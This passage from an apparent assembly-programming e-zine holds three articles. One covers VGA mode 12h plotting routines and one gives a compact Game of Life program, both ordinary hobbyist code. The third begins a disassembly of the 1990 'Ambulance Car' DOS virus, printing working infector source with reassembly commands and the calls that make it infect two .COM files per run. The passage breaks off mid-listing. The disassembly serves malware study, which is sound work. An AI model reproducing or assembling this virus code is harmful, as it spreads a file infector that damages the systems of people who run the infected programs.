+    ParaStrt db    'Manual   ', 0
+
+             Topic  9, 28, 'Power : '
+    ParaPowr db    'OFF', 0
+
+             Topic 360, 55, 'Group : '
+    ParaGrup db    '16 ', 0
+
+             TopicEnd
+    -------------- Topic ------------------------------------ End ----
+
+The Topic Macro puts the first two arguments (the new values for CurrX and
+CurrY) in the first two WORD positions of the definition table. The actual
+text is then put in the BYTE positions. In most cases there will be no #4
+argument, but A86 doesn't care about that.
+
+Each "to-print" table is shut down by an EndTopic Macro. It defines a new
+CurrX of -4096. That clearly is out of range, so this is end of table.
+In normal operation, small negative values of CurrX and CurrY are accepted and
+taken care of, although it can be dangerous to use this feature.
+
+
+Multiplying by 80.
+------------------
+On all CPU's form the 486, the MUL instruction is single cycle, so it'll be
+damn fast. For all older CPU's, the following code could mean some significant
+speed increases:
+
+    -------------------- Multiply ------------------------ Start ----
+    mul_80:  push  bx               ; PixAddr in Mode 012
+             shl   ax, 4
+             mov   bx, ax           ; bx = 16 x SCR_Y
+             shl   ax, 2            ; ax = 64 x SCR_Y
+             add   ax, bx           ; ax = 80 x SCR_Y
+             pop   bx
+             ret
+    -------------------- Multiply ------------------------- End -----
+
+This routine is used over and over again, so a few microseconds more or less
+will make a big difference.
+
+
+Where to leave our pixels?
+--------------------------
+Suppose you need to plot pixel (3,0). That's an easy one. It will fit in the
+very first byte of the VGA memory array. It's segment is 0A000 and it's offset
+is plain 0.
+But not the full byte, since that would produce a line. No, we need to access
+bit 4 of byte 0.
+
+Yes, the first pixel is bit 7 of byte 0 and the 8th pixel is bit 0 of byte 0.
+Or, in index-language, CurrX = 0 addresses bit 7, and so on.
+
+So we need to invert the screenposition into a bitposition. We'll come to that
+later. Suppose, by some sheer magic, we succeeded in making that conversion,
+we still need to tell the VGA which bit is involved. That's done by means of
+the following routine:
+
+    --------------------- SetMask ------------------------ Start -------
+    SetMask: push  dx               ; ah = mask
+             mov   dx, 03CE
+             mov   al, 8
+             out   dx, ax           ; set bit mask
+             pop   dx
+             ret
+    --------------------- SetMask ------------------------- End --------
+
+This is an optimized routine. The VGA is a 16 bit card, so we can use 16 bit
+I/O instructions for adjacent I/O ports. The construct:
+
+             mov   al, 8
+             out   dx, ax           ; set bit mask
+
+is identical to:
+
+             mov   al, 8
+             out   dx, al
+             inc   dx
+             mov   al, ah
+             out   dx, al
+
+Anyway, the plottingmask is defined to be as loaded in the AH register. We can
+put any value in AH, not just one pixel, but also "no pixels" and "all
+pixels".
+
+
+Defining colour in Mode 012.
+----------------------------
+Colours to use during plotting are defined in a comparable fashion:
+
+    --------------------- Set Colour --------------------- Start -------
+    SetColr: push  dx               ; ah = colour
+             mov   dx, 03C4
+             mov   al, 2
+             out   dx, ax           ; select page register and colour
+             pop   dx
+             ret
+    --------------------- Set Colour ---------------------- End --------
+
+In Mode 013 you just can load a bytevalue colour into a memory location and
+that's it. So that's an ultrafast resolution, but at the price of resolution.
+
+In Mode 012 we define colour with a series of I/O instructions. If a colour
+got set, it remains active until canceled by another SetColr call. Try to
+remember this when all on a sudden all kinds of fancy colours start to appear
+on screen....
+
+
+Where to put the pixel?
+-----------------------
+I have presented the formula some paragrpahs before this one. Basically we
+work with virtual coordinates and must translate these to real coordinates
+before trying to calculate an address. This is done by:
+
+    ------------------ VGA memory address ---------------- Start -------
+    VGaddr:                         ; calculate address in VGA memory
+             mov   es, [VGA_base]   ; quickly load segment register
+             mov   ax, [di.CurrY]   ; ax = current Y
+             add   ax, [di.Win_Y]   ; adjust for window offset
+             call  [di.Multiply]    ; multiply by bytes per row
+             mov   bx, [di.CurrX]   ; bx = current X
+             add   bx, [di.Win_X]   ; adjust for window offset
+             shr   bx, 3            ; divide by 8
+             add   bx, ax           ; bx = index address into video segment
+             ret
+    ------------------ VGA memory address ----------------- End --------
+
+It's all fairly straightforward.
+
+
+How do we plot pixels in Mode 012?
+----------------------------------
+This is a silly process. We cannot access all the 4 colour planes at once, so
+we have used SetColr to define which colourplanes are to be affected. This all
+is rather complicated. You may either believe me on my word, or consult a 1200
+page reference....
+
+Now that we're ready to plot pixels, we do so by the following code:
+
+    ------------------ VgaPlot -------------------- Start --------------
+    VgaPlot: mov   al, [es:bx]      ;  Do the actual plotting
+             mov   al, [ToPlot]
+             mov   [es:bx], al
+             ret
+    ------------------ VgaPlot --------------------- End ---------------
+
+The first line is a read command. It notifies the VGA controller about the
+address of the pixelbyte. The resulting data from the read is of no concern.
+We immediately replace it with the value of "ToPlot". For plotting there is a
+value of "FF" in this byte and for erasing there is a "00" in it.
+
+After this comes the actual plotting function. The write to the specified
+address sets the pixels as defined by AL and SetMask.
+
+Adding it all up gives the following code to really plot a pixel:
+
+    -------- PlotPix ------------------------------- Start -----------
+    PlotPix: push  ax, bx, cx, es   ; plot a point on screen
+             call  VGaddr
+             mov   cx, [di.CurrX]   ; calculate plottingmask
+             add   cx, [di.Win_X]
+             and   cx, 0111xB       ; cl = position in byte
+             mov   ah, 080
+             shr   ah, cl           ; now move the high bit backwards...
+             call  SetMask          ; use it to set mask
+             call  VgaPlot          ; and do the plotting
+             pop   es, cx, bx, ax
+             ret
+    -------- PlotPix -------------------------------- End ------------
+
+That's it to plot a pixel: just a few calls to some procedures we defined
+earlier on. The msjority of this procedure is comprised of the way to find the
+actual bit-position in the VGA memory byte. Remember, to plot pixel 0 we need
+bit 7!
+Therefore we load CX with the current X value, correct this for the current
+window position and isolate the lower 3 bits. These indicate the position of
+the pixel in screenmemory.
+
+             mov   cx, [di.CurrX]   ; calculate plottingmask
+             add   cx, [di.Win_X]
+             and   cx, 0111xB       ; cl = position in byte
+
+At this point, CL contains the n-th bit in this byte. So I load AH with the
+binary pattern 10000000 and shift it right until the corresponding bit
+position is reached:
+
+             mov   ah, 080
+             shr   ah, cl           ; now move the high bit backwards...
+
+I don't know if there are batches of Intel CPU's that have a problem with the
+SHR instruction is CL equals zero, but I have not yet noticed any.
+
+
+Lines: series of pixels.
+------------------------
+There are three kinds of lines: horizontal, vertical and sloped ones. Vertical
+lines are plotted pixel by pixel since all of them end up in different bytes
+of VGA memory. Sloped lines are best taken care of by a Bresenham-style line
+drawing algorithm (although the digital differential analyser is better).
+
+Horizontal lines are a different kind of line. In these, several adjacent
+pixels are plotted. And adjacent pixels mainly are in the same VGA memory
+byte. Therefore I made two horizontal line drawers. The one for short lines
+(less than 17 pixels) just plots the pixels one by one.
+The other algorithm, for lines of 17 pixels or more, tries to fill VGA memory
+with as much byte writes as possible.
+
+
+Taking care of longer horizontal lines.
+---------------------------------------
+Suppose our line is composed as follows:
+
+    First       1       2      3 ... K    Last    ; byte in video memory
+   ......## ######## ######## ###...### ###.....  ; # = pixel to be set
+
+So our line starts at pixel 6 (i.e. bit 1) of VGA memory byte "First". Next it
+lasts for N pixels and the last pixel to plot is pixel 2 (or bit 5).
+We need some variables to calculate how to proceed with this in the shortest
+possible time. This needs some calculations, so for short lines the math
+overhead is more work than the actual plotting will take up.
+
+    First       1       2      3 ... K    Last    ; byte in video memory
+   ......## ######## ######## ###...### ###.....  ; # = pixel to be set
+
+We first need to know the E-value which describes the number of pixels to plot
+in the very first byte. The E-value is calculated as follows:
+
+    E-val = 8 - ((CurrX + Win_X) AND 7)
+
+Now we know the number of pixels to plot in the very first VGA memory
+location. It would however come in handy if we would know with which plotting
+mask this would correspond. That's why we use it to derive the E-mask:
+
+   E-mask = FF shr ((8 - E-val) AND 7)
+
+Next we need to know how many pixels there need to be plotted in the last
+memory location. L-value and L-mask are determined as follows:
+
+    L-val = (Total - E-val) AND 7
+   L-mask = 080 sar L-val
+
+With the SAR we shift signbits to the right until the number of pixels
+corresponds with the number of bits in the mask.
+
+The last parameter we need to know is the actual speeding-up part: the full
+bytes that can be plotted. The octet-part of the routine. We do this as
+follows:
+
+    K-val = (T - E-val - L-val)/8
+
+Now it also becomes clear why I kept the E-val and L-val parameters. They're
+just needed for getting the right value for K-val.
+
+There is, however one exceptional situation. Suppose the line we need to plot
+is 26 pixels long, starting at pixel 6. This would produce the values:
+
+  E-val = 2                                     E-mask = 00000011
+  L-val = (26 - 2) AND 7 = 24 AND 7 = 0         L-mask = 00000000
+  K-val = (26 - 2 - 0)/8 = 3
+
+So, if the line ends on a byte boundary, we may NOT try to plot <A LOT> of
+pixels past it (in a plotting loop that starts with CX = 0).
+
+What the H_line procedure does is no more than what I decribed above. Here
+comes the source:
+
+    -------- H_Line -------------------------------- Start -----------
+    L0:      mov   cx, [di.DeltaX]      ; do a short line
+    L1:      call  PlotPix              ; by just repeating a single pixel-
+             inc   [di.CurrX]           ; plot and update of CurrX
+             loop  L1                   ; until done
+             pop   es, cx, bx, ax
+             ret
+
+    H_Line:  push  ax, bx, cx, es       ; optimized horizontal line drawing
+             cmp   [di.DeltaX], 17      ; too few pixels for a bulk draw?
+             jb    L0
+             mov   cx, [di.CurrX]       ; do a long line
+             add   cx, [di.Win_X]       ; first get the E-value as described
+             and   cx, 0111xB           ;   above
+             mov   bx, 8
+             sub   bx, cx
+             mov   [E_val], bx          ; pixels to plot in leftmost byte
+             mov   al, 0FF              ; now compose the mask to use there
+             shr   al, cl
+             mov   [E_mask], al         ; and store it in memory
+             mov   cx, [di.DeltaX]      ; CX = length of line
+             sub   cx, [E_val]          ; compensate for first-byte pixels
+             mov   ax, cx
+             and   ax, 0111xB           ; this many pixels in rigthmost byte
+             mov   [L_val], ax          ; and store it in memory
+             sub   cx, ax               ; CX = number of pixels inbetween
+             shr   cx, 3                ; divide by 8 pixels per byte
+             mov   [K_val], cx          ; number of "full" bytes to plot
+             clr   al                   ; AL := 0
+             mov   cx, [L_val]          ; prepare to compose L-mask
+             cmp   cx, 0                ; any bits in "last byte"
+             IF ne mov  al, bit 7       ; if any bits, setup AH register
+             dec   cx                   ; compensate for pixel 0, ...
+             sar   al, cl               ; ... compose plotting mask and ...
+             mov   [L_mask], al         ; ... store it into memory.
+                                        ; that's it. Let's plot!
+             call  VGaddr               ; load BX with address of byte in
+                                        ; VGA memory
+             mov   ah, [E_mask]
+             call  SetMask              ; set plotting mask and ...
+             call  VgaPlot              ; ... plot leftmost part
+             inc   bx                   ; get adjacent address
+             mov   cx, [K_val]          ; prepare for bulk-filling
+             jcxz  >L4                  ; if nothing to do, jump out
+             mov   ah, 0FF              ; else set ALL PIXELS mask
+             call  SetMask
+    L3:      call  VgaPlot              ; plot middle part
+             inc   bx
+             loop  L3                   ; until done
+    L4:      mov   ah, [L_mask]
+             call  SetMask
+             call  VgaPlot              ; plot remaining pixels
+             mov   ax, [di.DeltaX]
+             add   [di.CurrX], ax       ; make sure CurrX is updated
+             pop   es, cx, bx, ax       ; and git outa'here
+             ret
+    -------- H_Line --------------------------------- End ------------
+
+The preparations are the bulk of the work, but after that is done, the line is
+plotted with the lowest amount of I/O overhead.
+
+
+Vertical lines.
+---------------
+Vertical lines are simply plot by repeatedly calling PlotPix. It's so simple
+that neither need nor want to elaborate on it:
+
+    -------- VertLin ------------------------------- Start -----------
+    VertLin: push  cx                   ; draw a vertical line
+             mov   cx, [di.DeltaY]
+    L0:      call  PlotPix
+             inc   [di.CurrY]           ; adjust Y coordinate
+             loop  L0                   ; but not X value!
+             pop   cx
+             ret
+    -------- VertLin -------------------------------- End ------------
+
+
+What to do with linedrawing functions?
+--------------------------------------
+Now that we can draw lines, we can also draw boxes and window borders. This
+all looks very professional and the overview of a program is enhanced
+considerably. Try to figure out how to make the box-drawers by yourself.
+
+
+Plotting text.
+--------------
+Now that we have windows that can be put at any plotting position, we also
+need to be able to position text at any position. It doesn't look nice if
+different windows force text to default to byte boundaries. And with the
+experience we got from the H_line function, we are able to make a character
+plotter that puts text on screen at ANY position.
+
+I use a 9 x 16 character set. The nineth bit is just always blank, but it
+enhances readability considerably. The pixels in the bitmap are all 8 bits
+wide and 16 pixels tall.
+
+In exceptional cases, the bitmaps can be plotted at byte boundaries. In 85+ %
+of the time this will not be the case. Therefore I do the following:
+
+ - do some positioning math first
+ - repeat 16 times:
+   - load the byte of the bitmap in AH
+   - shift AX to the right the correct number of pixels
+   - plot the AH part
+ - if plotting on a byte boundary, we're done, else
+   - repeat 16 times:
+     - load the byte of the bitmap in AH
+     - shift AX to the right the correct number of pixels
+     - plot the AL part
+
+Let's just have a look:
+
+    -------- PutChar ------------------------------- Start -----------
+    L0:      add   [di.CurrY], 16       ; process 'LF'
+    L1:      pop   es, si, cx, bx
+             ret
+
+    L2:      mov   bx, [di.Indent]      ; process 'CR'
+             mov   [di.CurrX], bx
+             jmp   L1
+
+    PutChar: push  bx, cx, si, es       ; print char in al at (x,y)
+             cmp   al, lf
+             je    L0
+             cmp   al, cr
+             je    L2
+
+             mov   bx, [di.CurrX]
+             add   bx, CHR_WID
+             cmp   bx, [di.Win_wid]     ; still safe to print character?
+             jbe   >L3                  ; if so, skip over this part
+             mov   bx, [di.Indent]
+             mov   [di.CurrX], bx       ; mimick 'CR'
+             add   [di.CurrY], 16       ; mimick 'LF'
+
+    L3:      mov   cx, [di.CurrX]
+             add   cx, [di.Win_X]
+             and   cx, 0111xB
+             mov   [C_val], cl          ; store shiftcount for masks
+             mov   bx, 0FF00
+             shr   bx, cl               ; setup plotting mask and ...
+             mov   [P_mask], bx         ;     ... store it
+             clr   ah                   ; ax = ASCII code
+             mov   si, ax               ; make address of pixels in bitmap
+             shl   si, 4
+             add   si, offset bitmap
+             call  VGaddr               ; bx = -> in video memory
+             mov   ax, [P_mask]         ; only the AH part is used ...
+             call  SetMask              ; ... here.
+             mov   cx, 16               ; 16 pixel lines per token
+    L4:      push  cx                   ; we're in the loop now
+             mov   ah, [si]             ; AH = pixelpattern
+             clr   al                   ; AL = empty
+             mov   cl, [C_val]          ; get shiftcount
+             shr   ax, cl               ; distribute pixelBYTE across a WORD
+             mov   cl, [es:bx]          ; dummy read, CL is expendable
+             mov   [es:bx], ah          ; actual plotting of this half
+             add   bx, 80               ; point to next pixelbyte address
+             inc   si                   ; next pixeldata address
+             pop   cx
+             loop  L4                   ; and loop back
+
+             sub   bx, 16 * 80 - 1      ; back to original position
+             mov   ax, [P_mask]
+             cmp   al, 0                ; if nothing to do, ...
+             je    >L6                  ; ... skip this chapter
+             mov   ah, al               ; else repeat the lot for the right-
+             call  SetMask              ; most pixels....
+             mov   cx, 16
+             sub   si, cx               ; correct SI
+    L5:      push  cx
+             mov   ah, [si]
+             clr   al
+             mov   cl, [C_val]
+             shr   ax, cl
+             mov   cl, [es:bx]
+             mov   [es:bx], al
+             add   bx, 80
+             inc   si
+             pop   cx
+             loop  L5
+    L6:      add   [di.CurrX], CHR_WID  ; adjust CurrX value before ...
+             jmp   L1                   ; ... getting a hike
+    -------- PutChar -------------------------------- End ------------
+
+So far for plotting text. This routine will dump any character in any place of
+the graphics screen. But it needs a CurrX and a CurrY value to know where to
+plot things. This is both an advantage and a disadvantage. The advantage is
+that we can plot ANYWHERE we like. The disadvantage is that we need to
+elaborately specify CurrX and CurrY before the text is where we would like to
+have it.
+
+That's why I made the constrcut with the Topic and TopicEnd macro's, as
+described above.
+
+Here comes the code for printing a table on screen. We spent a lot of time on
+the preparations, and this is the stage where it is going to pay off. Look how
+much code we need for printing neat sets of tokens and characters on screen.
+
+    -------- Print --------------------------------- Start -----------
+    print:   mov   ah, [di.TxtCol]      ; print a table of text
+             call  SetColr
+    L0:      lodsw                      ; get Xpos
+             cmp   ax, 0F000            ; end of table?
+             je    ret                  ; exit, if so
+             mov   [di.CurrX], ax
+             lodsw                      ; get Ypos
+             mov   [di.CurrY], ax
+    L1:      lodsb                      ; get text
+             cmp   al, 0
+             je    L0
+             call  putchar              ; and print it
+             jmp   L1                   ; until this line is done
+    -------- Print ---------------------------------- End ------------
+
+Wit this approach, and starting from a working (empty) framework of routines,
+you can design the userinterface of your software within the hour. And it will
+look just fine.
+The actual code is then the only thing you need to worry about.....
+
+Having such routines, which have been tested and found reliable, you make the
+user interface easily and are able to concentrate on the actual coding the
+maximum amount of time. If the screen needs another layout (since you couldn't
+realize the function you considered), just change a few entries in the table.
+Many times just the X or Y values need some adjustment for better lining up,
+or for regrouping. No need to worry about the order of the plotting. Just make
+sure that the correct window is selected (for the colours) and that the table
+is terminated by a TopicEnd.
+
+
+Conclusion.
+-----------
+So far my elaboration on the VGA mode 12h. Again, I would rather use 800 x 600
+but that mode is not standardised. VGA 12h is standard on all VGA cards, so
+it's the best we can universally get and for many applications it is more than
+enough.
+
+Please try to make the BoxDrawing function. I will submit the "solution" to
+the next issue. For future issues I will start working on an explanation about 
+mouse-usage. This little rodent is nice to control many applications. If the 
+screen is well layed out, you don't need the keyboard for data entry. Just drag
+the mouse along the screen and poke him in the eye.
+
+
+The bitmap data for the character generator can be obtained from
+          http://asmjournal.freeservers.com/supplements/univ-vmode.html
+where the complete text of the article has been archived.
+
+
+
+::/ \::::::.
+:/___\:::::::.
+/|    \::::::::.
+:|   _/\:::::::::.
+:| _|\  \::::::::::.
+:::\_____\:::::::::::...........................................FEATURE.ARTICLE
+																			 Conway's Game of Life
+																			 by Laura Fairhead
+
+
+    I had the idea for this one day after stumbling upon a "gem" that
+somebody had written to play life. It was small and fast and reminded
+me of years ago when I had written many versions of this for the
+BBC Master 128 (my love lost). Since I had never written a version
+for the PC I thought that I would, and ended up spending some hours
+trimming off the bytes until it is now :- 156 bytes long. I must admit
+if it was not for the program that I found, this program would have been
+MUCH slower than it is. After I had written the code I tested it against
+the program that I had found and to my perplexity it was a great deal
+slower. After some hours of frustration I found the reason:- my program
+was accessing the video memory to do the bulk of its work. This must have
+brought about a factor of 12 decrease in speed!!
+
+    Life is a classic game of cellular automata by John Conway. It is
+played on an nxn grid of squares. Each square may be occuppied by a
+cell or empty. Each 'go' of the game the player calculates the next
+generation of a colony of cells by applying three simple rules:-
+
+(i)     a cell with less than 2 or more than 3 neighbours dies
+(ii)    a cell with 2 or 3 neighbours survives
+(iii)   a cell is born in a square with exactly 3 neighbours
+
+    A neighbouring square is one diagonally adjacent as well as the
+normal horizontal/vertical so each square has 8 neighbouring squares.
+
+    
+Overview of the code
+~~~~~~~~~~~~~~~~~~~~
+
+First, note that if we define
+
+        S:=state of square in this generation (0=empty, 1=occupied)
+        N:=number of neighbours
+       S':=state of square in the next generation
+
+then according to the rules
+
+        S'={0, if N<2 or N>3
+           {1, if (N=2 or N=3) and S=1
+           {1, if N=3
+
+so S'=1 iff (N=2 and S=1) or N=3
+
+this can be simplified using bitwise-OR to the dramatically simple:
+
+            S'= ( N|S=3 )
+
+note: iff means "if and only if"
+
+      "A iff B" means that A => B and B => A
+
+
+    The code uses one big array with one byte for each square that
+starts just after the program end. To save space it just assumes that it
+can use this memory since this is generally okay. However this is
+very bad practice really and it should use AH=04Ah/int 021h to adjust
+the memory size and abort if not successful.
+
+    The big array actually serves the purpose of 2 arrays; bit0 of
+a byte indicates the state of the square in the current generation. bit4
+of each byte indicates the state of the square in the next generation.
+
+    After initialisation, generation 0 is calculated by filling about
+1/4 of the array with 1's.
+
+    Now we do a loop to get the next generation. The screen is 0140h
+bytes across and 0C8h bytes down. Therefore:-
+
+    -0141h -0140h -013Fh
+
+    -0001h    .   +0001h
+
+    +013Fh +0140h +0141h
+
+    If DI is the offset of the array which we are calculating for,
+note that the neighbours can be summed as follows:-
+
+    MOV AX,[DI-0141h]
+    ADD AL,[DI-013Fh]
+    ADD AX,[DI+013Fh]
+    ADD AL,[DI+0141h]
+    ADD AL,[DI-1]
+    ADD AL,[DI+1]
+    ADD AL,AH
+
+    Note that if bit4 of any of the neighbours was set then we would
+still have the correct total in the least significant 4 bits of AL.
+
+    So from here the new cell state can be calculated simply:-
+
+    OR AL,[DI]
+    AND AL,0Fh
+
+    CMP AL,3
+
+    And if ZF=1 now we have a set cell.
+
+    JNZ ko
+    OR BYTE PTR [DI],010h
+ko:
+
+
+    When the next generation has been calculated we have done most of
+the work. The only thing is that if we want to iterate we need all
+of those bit4 's moved to bit0, also we want to display the next
+generation, this can be done easily at the same time.
+
+    Note that due to the structure of the code generation#0 is never
+displayed. Also we always have blue cells. Despite this it is quite
+an entertaining little program to watch....
+
+
+    The source here is in MASM format but should be trivial to convert
+to run on any assembler. It is assembled into a .COM file which means
+you should use the /T option on the linker (T=tiny).
+
+
+===========START OF CODE===================================================
+
+OPTION SEGMENT:USE16
+.386
+
+cseg SEGMENT BYTE
+
+ASSUME NOTHING
+ORG 0100h
+
+kode PROC NEAR
+
+;
+;mode 013h=320x200x256 (0140hx0C8h) and be kind with the stack
+;
+        MOV SP,0100h
+
+        MOV AX,013h
+        INT 010h
+        
+;
+;use current time as random number seed
+;in BP,DX which is used later
+;
+        MOV AH,02Ch
+        INT 021h  
+        MOV BP,CX
+;
+;get seg address of 1st seg after code for array store start
+;for now ES points there and DS=screen
+;
+        MOV AX,DS
+        ADD AX,01Ah             ;(OFFSET endofprog+0Fh>>4)=(1A)
+        MOV ES,AX              
+        MOV AX,0A000h
+        MOV DS,AX
+
+;
+;CREATE GENERATION#0
+;  this is done by filling approx 1/4 of the cells in the array
+;  'randomly', while taking care not to fill any edge cells
+;
+
+;
+;blank the array
+;  this is done to ensure the edge cells are clear
+;
+        XOR DI,DI
+        MOV CX,0FA00h
+        REP STOSB
+
+;
+;fill the array
+;  two nested loops, CL counts the rows, SI counts the columns
+;  this is so that after each row DI can be bumped past the edge
+;
+        MOV CL,0C6h
+        MOV DI,0141h            ;array offset we are addressing
+;
+;BX is 0141h from now until exit, it is used as a constant later
+;
+        MOV BX,DI
+      
+lopr0:  MOV SI,-013Eh
+        
+;
+;iterate random number seed in BP,DX
+;
+lopr:   LEA AX,[BP+DI]
+        ROR BP,3
+        XOR BP,DX
+        SUB DX,AX
+;
+;set cell with probability 1/4
+;
+        CMP AL,0C0h
+        SBB AL,AL
+        INC AX
+        STOSB
+;
+;
+        INC SI
+        JNZ lopr
+
+        SCASW                   ;DI+=2, skipping edge
+
+        LOOP lopr0
+    
+;
+;now we set DS=array, ES=screen. this doesn't change until exit
+;
+        PUSH ES
+        PUSH DS
+        POP ES
+        POP DS                  ;DS=vseg,ES=0A000h throughout
+
+;
+;'mlop' is the main loop, outputting generations until the user terminates
+;
+mlop:
+;
+;CREATE NEXT GENERATION
+;
+        MOV DI,BX               ;DI=0141h
+        
+;
+;'lopy' is the loop for rows, a count is not needed because we can get
+;the stop point from testing the array offset DI
+;
+
+lopy:   MOV SI,013Eh
+        
+;
+;'lopx' is the loop for columns, SI holds the count
+;
+
+;
+;get the total number of neighbours into the least significant 4 bits of AL
+;
+lopx:   MOV AX,[DI-0141h]
+        ADD AL,[DI-013Fh]
+        ADD AX,[DI+BX-2]
+        ADD AL,[DI+BX]
+        ADD AL,[DI-1]
+        ADD AL,[DI+1]
+        ADD AL,AH
+;
+;calculate new cell state
+;
+        OR AL,[DI]
+        AND AL,0Fh
+        CMP AL,3
+        JNZ SHORT ko
+        OR BYTE PTR [DI],010h
+
+ko:     INC DI
+
+        DEC SI
+        JNZ lopx
+
+;
+;(each row we miss 2 edge cells)
+;
+        SCASW
+        CMP DI,0FA00h-013Fh
+        JC lopy
+
+;
+;FIXUP ARRAY AND DISPLAY
+; bit4 is copied to bit0 in each byte. all other bits then cleared so
+; cells appear as blue pixels, also the iteration loop above assumes
+; that bit4 is clear on entry (it only sets it)
+;
+        MOV CX,03E80h
+        XOR DI,DI
+
+lopc:   LODSD
+        SHR EAX,4
+        AND EAX,01010101h
+        MOV [SI-4],EAX
+        STOSD
+        LOOP lopc
+
+;
+;USER KEYPRESS?
+;
+        MOV AH,0Bh
+        INT 021h
+        ADD AL,3
+;
+;no, back for next generation
+;
+        JP mlop
+;
+;yes, AL=2 now so make AX=2 to go into text mode
+;
+        CBW
+        INT 010h
+;
+;back to DOS
+;
+        MOV AH,04Ch
+        INT 021h
+
+kode ENDP
+
+endof EQU $
+
+cseg ENDS
+
+END FAR PTR kode
+
+
+===========END OF CODE=====================================================
+
+
+    While the code is optimised for size and for speed you may find that
+it runs too quickly. This can be easily remidied by the addition of a wait
+for vertical synchronisation loop (or vert sync as we techies call it).
+
+    Just add the following after the generation calculating code (that
+is after the instruction 'JC lopy'):-
+
+        MOV DX,03DAh
+
+lopv0:  IN AL,DX
+        AND AL,8
+        JNZ lopv0
+
+lopv1:  IN AL,DX
+        AND AL,8
+        JZ lopv1
+
+    Also if you add this the program size has changed. 'endofprog' is now
+01ABh, so the number of segments to add to DS to get the start of free space
+is now 01Bh. You must change the instruction at the beginning of the code:-
+
+        MOV AX,DS
+**      ADD AX,01Bh             ;(OFFSET endofprog+0Fh>>4)=(1B) **
+        MOV ES,AX              
+
+
+    One final note: I use SCASW in this code to increment DI by two.
+This is a well known space saving trick. However you must be wary since
+it does not do just that; it reads the memory at ES:[DI]. Generally this
+is fine but if DI=0FFFFh we will get a general protection fault.
+
+
+
+::/ \::::::.
+:/___\:::::::.
+/|    \::::::::.
+:|   _/\:::::::::.
+:| _|\  \::::::::::.
+:::\_____\:::::::::::...........................................FEATURE.ARTICLE
+                                                    'Ambulance Car' Disassembly
+                                                    by Chili
+
+
+This virus  has definitely  my  favourite  payload of  all times.  I just  love
+seeing that little  ambulance run  across the screen with  a 'siren' playing at
+the same time.  Other than that, the virus itself isn't much of a thing.  Don't
+forget though, that it is dated back to at least 1990.
+
+It is a non-resident  .COM infector,  and each time an  infected file is run it
+will attempt to  infect  two files  (be it  in the  current  directory  or in a
+directory  located in  the PATH)  in a parasitic  manner.  Infected files  will
+experience a 796 bytes growth, being the main virus body appended to the end of
+the host. Also the host file's date and time will be preserved.  On ocasion the
+virus will display the 'ambulance car' payload.
+
+The  virus doesn't  preserve the initial  contents of  AX and so  programs like
+HotDIR fail to run when infected.  Also if there is any  reference to 'PATH' in
+the environment block before  the actual PATH string the virus will assume that
+to be the actual PATH (i.e. 'CLASSPATH=...').
+
+
+Playing it safe
+---------------
+At the DOS prompt type "PATH ;" so that the virus will only infect files in the
+current directory and you can keep track of things.  Also if all you want to do
+is see the payload,  then comment the following lines in the source code (right
+after the delta offset calculation) so that no files are infected:
+
+                call    search_n_infect
+                call    search_n_infect
+
+Moreover you should comment the lines presented below (for the 'RedXAny' strain
+look-alike) so that the payload is shown everytime the virus is run.
+
+In case  things start to  get out of hand,  you should do  one of three things:
+either disinfect the files yourself with an hex editor,  use the latest version
+of F-PROT  (available from ftp.complex.is or through Simtel and Garbo)  to scan
+and clean the infected files or use my own disinfector  (in another article) to
+clean this specific strain.
+
+[NOTE: F-PROT  will  report  the  strain  whose  source  code is  presented  as
+       Ambulance.796.D]
+
+Keep in mind that  this virus is not destructive,  so feel free to go ahead and
+infect your entire computer (you really shouldn't do this,  since accidents can
+sometimes happen!).
+
+
+Strains
+-------
+A  'RedXAny'  strain look-alike  can be  obatined  by commenting  the following
+lines (both in the 'payload' procedure):
+
+                jne     exit_payload            ;  (starting  with  the  sixth)
+
+                jnz     exit_payload            ;  don't show payload
+
+[NOTE: This will not give you the actual 'RedXAny' strain, but one that behaves
+       in the same manner - always shows the ambulance car]
+
+Other strains exist,  but will not be  discussed here,  has nothing of interest
+would be added.
+
+
+Compatibility
+-------------
+The virus runs ok in a Win95's DOS box.  Also, remember that for the payload to
+be apreciated in full, a PC Speaker is required.  Bad luck for those of you who
+don't have a computer with one...
+
+
+Here is the disassembly:
+
+--8<---------------------------------------------------------------------------
+
+; Ambulance Car (aka Ambulance, RedX, Red Cross)
+; Ambulance-B strain (or so it seems!)
+; Disassembly by Chili for APJ #6
+; Byte for byte match when assembled with TASM 4.1
+; Assemble with:
+;       tasm /ml /m2 ambul-b.asm
+;       tlink /t ambul-b.obj
+
+
+PSP_environment_seg     equ     2Ch     ; PSP location of process'  environment
+                                        ;  block segment address
+
+BDA_addr                equ     40h     ; BDA (Bios Data Area) segment address
+
+BDA_LPT3_port_addr      equ     0Ch     ; BDA  location of  LPT3 I/O port  base
+                                        ;  address
+BDA_video_mode          equ     49h     ; BDA location of current video mode
+BDA_timer_counter       equ     6Ch     ; BDA location of number of timer ticks
+                                        ;  (18.2 per second) since midnight
+
+
+_TEXT           segment word public 'code'
+                assume  cs:_TEXT, ds:_TEXT, es:_TEXT, ss:_TEXT
+
+                org     100h
+
+; Host and virus' main body
+;--------------------------
+ambulance_car   proc    far
+
+; Jump over host to real beginning of virus
+
+                db      0E9h, 01h, 00h  ; Harcoded relative near jump
+
+; Host (missing the first 3 bytes)
+;
+; Dummy host is just 4 bytes so only a 'nop' here
+
+host:
+                nop
+
+; Calculate the delta offset
+;
+; This piece of code  will 'fool' some disassemblers and so it will  appear as:
+;
+;       call    $+4
+;       add     [bp-7Fh], bx
+;       out     dx, al
+;       add     ax, [bx+di]
+;
+; Pretty basic, but could turn out to be somewhat annoying if used all over the
+; place (for the person doing the disassembly, that is!)
+;
+; (because of 'db 01h';  used since  the near jump  above is also  3 bytes long
+;  and that has to be taken into account for the displacement calculation)
+
+real_start:
+                call    find_displacement
+                db      01h             ; Used to make this add up to 3 bytes
+find_displacement:
+                pop     si
+                sub     si, offset host
+
+; Infect twice then load up the payload
+
+                call    search_n_infect
+                call    search_n_infect
+                call    payload
+
+; Restore host's original first 3 bytes
+
+                lea     bx, [si+original_3bytes-4]
+                mov     di, offset ambulance_car
+                mov     al, [bx]
+                mov     [di], al        ; Restore 1st byte
+                mov     ax, [bx+1]
+                mov     [di+1], ax      ; Restore 2nd and 3rd bytes
+
+; Return control to host
+
+                jmp     di
+
+; Move on to next step (be it 'search_n_infect' or 'payload')
+
+next_step:
+                retn
+
+ambulance_car   endp
+
+
+; Search for a file and infect it
+;--------------------------------
+search_n_infect proc    near
+
+; Search for the file
+
+                call    search
+
+; Found any file?
+
+                mov     al, byte ptr [si+file_mask-4]
+                or      al, al                  ; If not,  then move  on to the
+                jz      next_step               ;  next step
+
